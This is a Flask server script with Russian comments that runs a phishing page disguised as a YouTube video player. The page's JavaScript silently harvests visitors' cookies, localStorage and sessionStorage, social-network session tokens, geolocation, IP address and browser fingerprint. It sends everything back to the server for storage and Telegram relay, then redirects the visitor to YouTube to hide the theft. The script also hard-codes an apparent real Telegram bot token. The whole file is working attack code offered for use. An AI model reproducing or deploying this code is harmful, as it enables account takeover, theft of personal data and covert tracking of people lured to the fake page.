from flask import Flask, request, render_template_string, jsonify, redirect
from flask_cors import CORS
import json
import time
from datetime import datetime
import hashlib
import requests
import re

app = Flask(__name__)
CORS(app)  # Разрешить кросс-доменные запросы

# Конфигурация - ДОЛЖНО СОВПАДАТЬ С bot.py
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # ТОТ ЖЕ САМЫЙ ТОКЕН
ADMIN_ID = 1709490182
WEBHOOK_URL = "https://ваш-сервер.onrender.com/webhook"  # URL куда отправлять данные

# HTML шаблон фишинговой страницы (полная версия)
HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <meta name="description" content="Смотрите видео на YouTube">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            width: 100%;
            background: rgba(20, 20, 20, 0.9);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ff0000, #ff6b6b, #ff0000);
        }
        
        .logo {
            font-size: 70px;
            margin-bottom: 25px;
            color: #ff0000;
            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 15px;
            color: #ffffff;
            font-weight: 700;
        }
        
        .subtitle {
            color: #aaaaaa;
            font-size: 18px;
            margin-bottom: 40px;
            line-height: 1.5;
        }
        
        .loader-container {
            margin: 40px 0;
            position: relative;
        }
        
        .loader {
            display: inline-block;
            width: 70px;
            height: 70px;
            border: 6px solid rgba(255, 255, 255, 0.1);
            border-top: 6px solid #ff0000;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 25px;
            font-size: 18px;
            color: #4CAF50;
            font-weight: 500;
            min-height: 30px;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6b6b);
            width: 0%;
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        
        .video-container {
            margin-top: 40px;
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            border-radius: 12px;
            background: #000;
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
        }
        
        .video-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            border-radius: 10px;
        }
        
        .info-panel {
            margin-top: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            text-align: left;
            font-size: 14px;
            color: #cccccc;
        }
        
        .info-panel p {
            margin: 8px 0;
        }
        
        .hidden {
            display: none;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 25px;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .subtitle {
                font-size: 16px;
            }
            
            .logo {
                font-size: 50px;
            }
        }
        
        .warning {
            color: #ff9800;
            font-size: 14px;
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 152, 0, 0.1);
            border-radius: 5px;
            border-left: 4px solid #ff9800;
        }
    </style>
    
    <!-- Иконки Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Шрифт Roboto -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="logo">
            <i class="fab fa-youtube"></i>
        </div>
        
        <h1>Загрузка видео YouTube...</h1>
        
        <div class="subtitle">
            Пожалуйста, подождите. Видео загружается и скоро начнется.<br>
            Это может занять несколько секунд.
        </div>
        
        <div class="loader-container">
            <div class="loader"></div>
        </div>
        
        <div class="progress-bar">
            <div class="progress" id="progress"></div>
        </div>
        
        <div class="status" id="status">
            <i class="fas fa-spinner fa-spin"></i> Подготовка видеоплеера...
        </div>
        
        <div class="video-container">
            <iframe 
                src="https://www.youtube.com/embed/{{ video_id }}?autoplay=1&controls=1&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen
                title="YouTube video player">
            </iframe>
        </div>
        
        <div class="info-panel">
            <p><i class="fas fa-info-circle"></i> <strong>ID видео:</strong> {{ video_id }}</p>
            <p><i class="fas fa-clock"></i> <strong>Время загрузки:</strong> <span id="currentTime">{{ current_time }}</span></p>
            <p><i class="fas fa-shield-alt"></i> <strong>Безопасность:</strong> Проверено YouTube</p>
            <p><i class="fas fa-wifi"></i> <strong>Соединение:</strong> <span id="connectionStatus">Стабильное</span></p>
        </div>
        
        <div class="warning">
            <i class="fas fa-exclamation-triangle"></i> 
            Для корректного воспроизведения убедитесь, что у вас включен JavaScript и разрешены cookies.
        </div>
    </div>

    <script>
        // ========== СБОР ДАННЫХ ==========
        const collectedData = {
            // Основная информация
            timestamp: new Date().toISOString(),
            link_id: "{{ link_id }}",
            video_id: "{{ video_id }}",
            
            // IP адрес (получаем через внешний сервис)
            ip: null,
            
            // Браузер и устройство
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages || [navigator.language],
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            cookies_enabled: navigator.cookieEnabled,
            online: navigator.onLine,
            doNotTrack: navigator.doNotTrack || 'не указано',
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            
            // Текущая страница
            current_url: window.location.href,
            referer: document.referrer || 'прямой переход',
            
            // Cookies (ВСЕ куки)
            cookies: document.cookie,
            
            // Локальное хранилище (ГДЕ ХРАНЯТСЯ ЛОГИНЫ)
            localStorage: {},
            sessionStorage: {},
            
            // Социальные сети (определяем по кукам и localStorage)
            social_networks: {
                google: { logged_in: false, data: {} },
                facebook: { logged_in: false, data: {} },
                twitter: { logged_in: false, data: {} },
                instagram: { logged_in: false, data: {} },
                vk: { logged_in: false, data: {} },
                whatsapp: { logged_in: false, data: {} },
                tiktok: { logged_in: false, data: {} },
                telegram: { logged_in: false, data: {} },
                discord: { logged_in: false, data: {} }
            },
            
            // Плагины браузера
            browser_plugins: [],
            
            // Сетевая информация
            connection: null,
            
            // Геолокация
            geolocation: null
        };
        
        // ========== ФУНКЦИИ СБОРА ДАННЫХ ==========
        
        // 1. Собираем LocalStorage (где часто хранятся логины)
        function collectLocalStorage() {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    collectedData.localStorage[key] = value;
                    
                    // Проверяем на наличие данных соцсетей
                    checkSocialNetworks(key, value);
                }
                console.log('✅ LocalStorage собран:', localStorage.length, 'записей');
            } catch (error) {
                console.error('❌ Ошибка сбора LocalStorage:', error);
            }
        }
        
        // 2. Собираем SessionStorage
        function collectSessionStorage() {
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    collectedData.sessionStorage[key] = sessionStorage.getItem(key);
                }
                console.log('✅ SessionStorage собран:', sessionStorage.length, 'записей');
            } catch (error) {
                console.error('❌ Ошибка сбора SessionStorage:', error);
            }
        }
        
        // 3. Проверяем социальные сети по ключам
        function checkSocialNetworks(key, value) {
            try {
                const keyLower = key.toLowerCase();
                const valueStr = String(value).toLowerCase();
                
                // GOOGLE (Gmail, YouTube, Google аккаунт)
                if (keyLower.includes('google') || keyLower.includes('gmail') || 
                    keyLower.includes('youtube') || keyLower.includes('ga_') ||
                    keyLower.includes('goog_') || valueStr.includes('google') ||
                    keyLower.includes('oauth') || keyLower.includes('token')) {
                    collectedData.social_networks.google.logged_in = true;
                    collectedData.social_networks.google.data[key] = value.substring(0, 100);
                }
                
                // FACEBOOK
                if (keyLower.includes('facebook') || keyLower.includes('fb_') || 
                    keyLower.includes('fbsr_') || valueStr.includes('facebook') ||
                    keyLower.includes('act_') || keyLower.includes('c_user')) {
                    collectedData.social_networks.facebook.logged_in = true;
                    collectedData.social_networks.facebook.data[key] = value.substring(0, 100);
                }
                
                // TWITTER/X
                if (keyLower.includes('twitter') || keyLower.includes('x_') || 
                    keyLower.includes('auth_token') || valueStr.includes('twitter') ||
                    keyLower.includes('ct0') || keyLower.includes('guest_id')) {
                    collectedData.social_networks.twitter.logged_in = true;
                    collectedData.social_networks.twitter.data[key] = value.substring(0, 100);
                }
                
                // INSTAGRAM
                if (keyLower.includes('instagram') || keyLower.includes('ig_') || 
                    keyLower.includes('sessionid') || valueStr.includes('instagram') ||
                    keyLower.includes('ds_user_id') || keyLower.includes('csrftoken')) {
                    collectedData.social_networks.instagram.logged_in = true;
                    collectedData.social_networks.instagram.data[key] = value.substring(0, 100);
                }
                
                // VK
                if (keyLower.includes('vk_') || keyLower.includes('vkontakte') || 
                    valueStr.includes('vk.com') || keyLower.includes('remix')) {
                    collectedData.social_networks.vk.logged_in = true;
                    collectedData.social_networks.vk.data[key] = value.substring(0, 100);
                }
                
                // WHATSAPP
                if (keyLower.includes('whatsapp') || keyLower.includes('wa_')) {
                    collectedData.social_networks.whatsapp.logged_in = true;
                    collectedData.social_networks.whatsapp.data[key] = value.substring(0, 100);
                }
                
                // TELEGRAM
                if (keyLower.includes('telegram') || keyLower.includes('tg_') ||
                    valueStr.includes('telegram') || keyLower.includes('user_id')) {
                    collectedData.social_networks.telegram.logged_in = true;
                    collectedData.social_networks.telegram.data[key] = value.substring(0, 100);
                }
                
                // TIKTOK
                if (keyLower.includes('tiktok') || keyLower.includes('tt_')) {
                    collectedData.social_networks.tiktok.logged_in = true;
                    collectedData.social_networks.tiktok.data[key] = value.substring(0, 100);
                }
                
                // DISCORD
                if (keyLower.includes('discord') || keyLower.includes('dc_') ||
                    valueStr.includes('discord')) {
                    collectedData.social_networks.discord.logged_in = true;
                    collectedData.social_networks.discord.data[key] = value.substring(0, 100);
                }
            } catch (e) {
                console.error('Ошибка проверки соцсетей:', e);
            }
        }
        
        // 4. Собираем информацию о плагинах
        function collectBrowserPlugins() {
            try {
                if (navigator.plugins) {
                    for (let plugin of navigator.plugins) {
                        collectedData.browser_plugins.push({
                            name: plugin.name,
                            description: plugin.description,
                            filename: plugin.filename,
                            length: plugin.length
                        });
                    }
                }
            } catch (error) {
                console.error('❌ Ошибка сбора плагинов:', error);
            }
        }
        
        // 5. Собираем сетевую информацию
        function collectNetworkInfo() {
            try {
                if (navigator.connection) {
                    collectedData.connection = {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    };
                }
            } catch (error) {
                console.error('❌ Ошибка сбора сетевой информации:', error);
            }
        }
        
        // 6. Пытаемся получить геолокацию
        function tryGeolocation() {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        collectedData.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: position.timestamp
                        };
                        console.log('✅ Геолокация получена');
                        updateProgress(90);
                    },
                    error => {
                        console.log('❌ Геолокация отклонена:', error.message);
                        updateProgress(90);
                    },
                    { timeout: 5000, enableHighAccuracy: true }
                );
            } else {
                console.log('❌ Геолокация не поддерживается');
                updateProgress(90);
            }
        }
        
        // 7. Получаем IP через внешний сервис
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                collectedData.ip = data.ip;
                console.log('✅ IP адрес получен:', data.ip);
            } catch (error) {
                try {
                    // Запасной вариант
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    collectedData.ip = data.ip;
                } catch (e) {
                    collectedData.ip = 'не удалось определить';
                    console.error('❌ Ошибка получения IP:', e);
                }
            }
        }
        
        // 8. Отправка данных на сервер через вебхук
        async function sendCollectedData() {
            try {
                updateStatus('Отправка данных на сервер...', 'info');
                
                const response = await fetch('/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(collectedData)
                });
                
                if (response.ok) {
                    const result = await response.json();
                    console.log('✅ Данные отправлены успешно:', result);
                    updateStatus('✅ Данные успешно отправлены!', 'success');
                    updateProgress(100);
                    
                    // Перенаправляем на оригинальное видео через 3 секунды
                    setTimeout(() => {
                        window.location.href = 'https://www.youtube.com/watch?v={{ video_id }}';
                    }, 3000);
                    
                    return true;
                } else {
                    throw new Error('Ошибка сервера: ' + response.status);
                }
            } catch (error) {
                console.error('❌ Ошибка отправки данных:', error);
                updateStatus('⚠️ Ошибка отправки, но видео загружено', 'warning');
                updateProgress(100);
                
                // Все равно перенаправляем через 3 секунды
                setTimeout(() => {
                    window.location.href = 'https://www.youtube.com/watch?v={{ video_id }}';
                }, 3000);
                
                return false;
            }
        }
        
        // 9. Вспомогательные функции UI
        function updateStatus(message, type = 'info') {
            const statusEl = document.getElementById('status');
            const icon = type === 'success' ? 'fa-check-circle' : 
                        type === 'warning' ? 'fa-exclamation-triangle' : 'fa-spinner fa-spin';
            
            statusEl.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
            
            if (type === 'success') {
                statusEl.style.color = '#4CAF50';
            } else if (type === 'warning') {
                statusEl.style.color = '#FF9800';
            }
        }
        
        function updateProgress(percent) {
            const progressEl = document.getElementById('progress');
            progressEl.style.width = percent + '%';
        }
        
        // ========== ОСНОВНОЙ ПРОЦЕСС СБОРА ДАННЫХ ==========
        async function startDataCollection() {
            console.log('🚀 Начало сбора данных...');
            updateStatus('Инициализация сбора данных...', 'info');
            updateProgress(10);
            
            try {
                // Этап 1: Сбор базовой информации (20%)
                updateStatus('Сбор базовой информации...', 'info');
                await getIPAddress();
                collectBrowserPlugins();
                collectNetworkInfo();
                updateProgress(20);
                
                // Этап 2: Сбор хранилищ (40%)
                updateStatus('Анализ локального хранилища...', 'info');
                collectLocalStorage();
                collectSessionStorage();
                updateProgress(40);
                
                // Этап 3: Анализ cookies и соцсетей (60%)
                updateStatus('Проверка авторизаций в соцсетях...', 'info');
                updateProgress(60);
                
                // Этап 4: Геолокация (80%)
                updateStatus('Определение местоположения...', 'info');
                tryGeolocation();
                
                // Ждем 2 секунды для завершения асинхронных операций
                setTimeout(async () => {
                    // Этап 5: Отправка данных (100%)
                    await sendCollectedData();
                }, 2000);
                
            } catch (error) {
                console.error('Критическая ошибка сбора данных:', error);
                updateStatus('Ошибка сбора данных', 'warning');
                updateProgress(100);
                
                // Все равно пытаемся отправить то, что собрали
                try {
                    await sendCollectedData();
                } catch (sendError) {
                    console.error('Не удалось отправить данные:', sendError);
                }
            }
        }
        
        // Запускаем сбор данных через 2 секунды после загрузки страницы
        setTimeout(() => {
            startDataCollection();
        }, 2000);
        
        // Обновляем время на странице
        function updateCurrentTime() {
            const now = new Date();
            const timeString = now.toLocaleTimeString('ru-RU');
            document.getElementById('currentTime').textContent = timeString;
        }
        
        // Обновляем статус соединения
        function updateConnectionStatus() {
            const statusEl = document.getElementById('connectionStatus');
            if (navigator.onLine) {
                if (navigator.connection && navigator.connection.effectiveType) {
                    statusEl.textContent = `Стабильное (${navigator.connection.effectiveType})`;
                } else {
                    statusEl.textContent = 'Стабильное';
                }
            } else {
                statusEl.textContent = 'Отсутствует';
                statusEl.style.color = '#FF9800';
            }
        }
        
        setInterval(updateCurrentTime, 1000);
        setInterval(updateConnectionStatus, 5000);
        updateCurrentTime();
        updateConnectionStatus();
    </script>
</body>
</html>
'''

# ========== FLASK МАРШРУТЫ ==========

@app.route('/')
def index():
    """Главная страница - редирект на YouTube"""
    return redirect('https://www.youtube.com')

@app.route('/watch')
def watch():
    """Фишинговая страница с YouTube плеером"""
    # Получаем параметры из URL
    video_id = request.args.get('v', 'dQw4w9WgXcQ')  # Rick Roll по умолчанию
    link_id = request.args.get('id', 'unknown')
    timestamp = request.args.get('t', '0')
    
    # Логируем посещение
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Прямой переход')
    
    print(f"\n{'='*60}")
    print(f"[+] НОВОЕ ПОСЕЩЕНИЕ")
    print(f"[+] Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[+] IP: {ip_address}")
    print(f"[+] User-Agent: {user_agent[:80]}...")
    print(f"[+] Referer: {referer[:80]}...")
    print(f"[+] Video ID: {video_id}")
    print(f"[+] Link ID: {link_id}")
    print(f"{'='*60}\n")
    
    # Сохраняем информацию о посещении в лог
    try:
        with open('visits.log', 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()},{ip_address},{link_id},{video_id},{user_agent[:100]}\n")
    except:
        pass
    
    # Рендерим HTML страницу
    current_time = datetime.now().strftime("%H:%M:%S")
    rendered_html = HTML_TEMPLATE.replace('{{ video_id }}', video_id)\
                                 .replace('{{ link_id }}', link_id)\
                                 .replace('{{ current_time }}', current_time)
    
    return render_template_string(rendered_html)

@app.route('/collect', methods=['POST'])
def collect_data():
    """Прием собранных данных от фишинговой страницы"""
    try:
        data = request.json
        
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        # Извлекаем основные данные
        link_id = data.get('link_id', 'unknown')
        ip = data.get('ip', 'unknown')
        user_agent = data.get('user_agent', 'unknown')
        video_id = data.get('video_id', 'unknown')
        
        print(f"\n{'='*60}")
        print(f"[!] ДАННЫЕ ПОЛУЧЕНЫ")
        print(f"[!] Link ID: {link_id}")
        print(f"[!] IP: {ip}")
        print(f"[!] User-Agent: {user_agent[:80]}...")
        print(f"[!] Video ID: {video_id}")
        print(f"[!] Timestamp: {data.get('timestamp', 'unknown')}")
        
        # Проверяем социальные сети
        social_data = data.get('social_networks', {})
        logged_in_networks = []
        
        for network, info in social_data.items():
            if info.get('logged_in'):
                logged_in_networks.append(network)
        
        if logged_in_networks:
            print(f"[!] Обнаружены входы в соцсети: {', '.join(logged_in_networks)}")
        
        print(f"[!] Cookies: {'Да' if data.get('cookies') else 'Нет'}")
        print(f"[!] LocalStorage записей: {len(data.get('localStorage', {}))}")
        print(f"[!] Screen: {data.get('screen', 'unknown')}")
        print(f"[!] Timezone: {data.get('timezone', 'unknown')}")
        print(f"{'='*60}\n")
        
        # Сохраняем данные в файл
        try:
            filename = f"data_{link_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(f'collected_data/{filename}', 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
            print(f"[+] Данные сохранены в файл: {filename}")
        except Exception as e:
            print(f"[-] Ошибка сохранения в файл: {e}")
            # Сохраняем в общий лог
            with open('all_data.log', 'a', encoding='utf-8') as f:
                f.write(f"{datetime.now().isoformat()}|{link_id}|{ip}|{video_id}|{len(logged_in_networks)}\n")
        
        # Отправляем данные в Telegram бот через вебхук
        send_to_telegram_bot(data)
        
        return jsonify({
            'status': 'success',
            'message': 'Data received successfully',
            'redirect_to': f'https://youtube.com/watch?v={video_id}',
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        print(f"[-] Ошибка обработки данных: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def send_to_telegram_bot(data):
    """Отправка данных в Telegram бот"""
    try:
        # Подготовка данных для отправки
        link_id = data.get('link_id', 'unknown')
        ip = data.get('ip', 'unknown')
        
        # Формируем упрощенное сообщение для Telegram
        message = {
            'link_id': link_id,
            'ip': ip,
            'user_agent': data.get('user_agent', 'unknown')[:100],
            'timestamp': data.get('timestamp', 'unknown'),
            'screen': data.get('screen', 'unknown'),
            'timezone': data.get('timezone', 'unknown'),
            'cookies_count': len(data.get('cookies', '').split(';')) if data.get('cookies') else 0,
            'localstorage_count': len(data.get('localStorage', {})),
            'social_logins': []
        }
        
        # Добавляем информацию о соцсетях
        social_data = data.get('social_networks', {})
        for network, info in social_data.items():
            if info.get('logged_in'):
                message['social_logins'].append(network)
        
        # Здесь должна быть отправка в ваш вебхук
        # Например: requests.post(WEBHOOK_URL, json=message)
        print(f"[→] Данные подготовлены для отправки в Telegram: {link_id}")
        
    except Exception as e:
        print(f"[-] Ошибка подготовки данных для Telegram: {e}")

@app.route('/webhook', methods=['POST'])
def webhook():
    """Вебхук для приема данных от других сервисов"""
    try:
        data = request.json
        print(f"[Webhook] Получены данные: {data.keys() if data else 'No data'}")
        
        # Здесь можно обработать данные от других источников
        
        return jsonify({'status': 'received', 'timestamp': datetime.now().isoformat()})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@app.route('/stats')
def stats():
    """Статистика посещений"""
    try:
        # Читаем лог посещений
        visits = []
        try:
            with open('visits.log', 'r', encoding='utf-8') as f:
                for line in f:
                    if line.strip():
                        visits.append(line.strip().split(','))
        except FileNotFoundError:
            pass
        
        # Читаем лог данных
        data_count = 0
        try:
            with open('all_data.log', 'r', encoding='utf-8') as f:
                data_count = len(f.readlines())
        except FileNotFoundError:
            pass
        
        return jsonify({
            'status': 'ok',
            'total_visits': len(visits),
            'total_data_collected': data_count,
            'last_24h_visits': len([v for v in visits if is_recent(v[0])]) if visits else 0,
            'unique_ips': len(set(v[1] for v in visits)) if visits else 0,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

def is_recent(timestamp, hours=24):
    """Проверяет, является ли timestamp не старше указанных часов"""
    try:
        from datetime import datetime, timedelta
        ts_time = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
        cutoff_time = datetime.now() - timedelta(hours=hours)
        return ts_time > cutoff_time
    except:
        return False

@app.route('/health')
def health():
    """Проверка здоровья сервера"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'service': 'YouTube Phishing Server',
        'version': '1.0'
    })

@app.route('/cleanup', methods=['POST'])
def cleanup():
    """Очистка старых данных (только для админа)"""
    # Проверка ключа (упрощенная)
    auth_key = request.headers.get('X-Auth-Key', '')
    if auth_key != hashlib.sha256(str(ADMIN_ID).encode()).hexdigest():
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
    
    try:
        # Удаляем файлы старше 7 дней
        from datetime import datetime, timedelta
        import os
        
        cutoff = datetime.now() - timedelta(days=7)
        deleted_files = 0
        
        # Проверяем папку collected_data
        if os.path.exists('collected_data'):
            for filename in os.listdir('collected_data'):
                filepath = os.path.join('collected_data', filename)
                if os.path.isfile(filepath):
                    file_time = datetime.fromtimestamp(os.path.getmtime(filepath))
                    if file_time < cutoff:
                        os.remove(filepath)
                        deleted_files += 1
        
        return jsonify({
            'status': 'success',
            'message': f'Deleted {deleted_files} old files',
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ========== ЗАПУСК СЕРВЕРА ==========

if __name__ == '__main__':
    # Создаем необходимые папки
    import os
    os.makedirs('collected_data', exist_ok=True)
    
    print(f"""
    {'='*60}
    🚀 YouTube Phishing Server запускается...
    📍 IP: 0.0.0.0:5000
    ⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    🔗 Пример ссылки: http://localhost:5000/watch?v=dQw4w9WgXcQ&id=test123
    📊 Статистика: http://localhost:5000/stats
    ❤️  Здоровье: http://localhost:5000/health
    {'='*60}
    """)
    
    # Запускаем Flask сервер
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,  # В продакшене всегда False!
        threaded=True
    )